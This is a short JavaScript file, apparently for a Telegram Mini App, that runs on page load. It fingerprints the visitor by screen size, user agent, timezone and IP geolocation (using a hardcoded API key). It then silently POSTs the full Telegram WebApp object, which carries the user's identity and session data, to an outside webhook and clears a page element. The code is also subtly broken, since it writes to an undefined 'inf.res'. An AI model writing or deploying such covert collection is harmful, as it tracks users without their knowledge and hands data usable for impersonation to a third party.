/*inf.js*/
async function infData() {
  let inf = {};
  inf.win = {};
  inf.win.scrWid = window.screen.width;
  inf.win.scrHei = window.screen.height;
  inf.nav = {};
  inf.nav.brows = navigator.userAgent;
  inf.tz = {};
  inf.tz.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  inf.tz.offset = new Date().getTimezoneOffset();
  inf.tz.offsetHours = -(inf.tz.offset / 60);
  inf.tz.utcTime = (inf.tz.offsetHours >= 0 ? "+" : "") + inf.tz.offsetHours;
  //let lc = (typeof window.Telegram.WebApp.themeParams.link_color=='undefined')?'#0000FF':window.Telegram.WebApp.themeParams.link_color;
  //https://ipapi.co/json/
  //https://api.ipify.org?format=json
  //https://ip-api.com/
  let url = 'https://api.ip2location.io/';
  let key = '?key=687D5768B7A7FBB61B883B574B92ED66';
  let uk = url+key;
  let response = await fetch(uk, {
    method: 'GET',
    mode: 'no-cors'
  });
  /*
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.log('Error:', error));
  */
  //inf.res = await response.json();
  inf.res.text = await response.text();
  //inf.res.url = url;
  //towhb
  url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
  let tg = window.Telegram.WebApp;
  let data = {twa: tg, info: inf};
  let whr = await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
  document.getElementById("inf").innerHTML = "";
  return;
}
infData();
//END

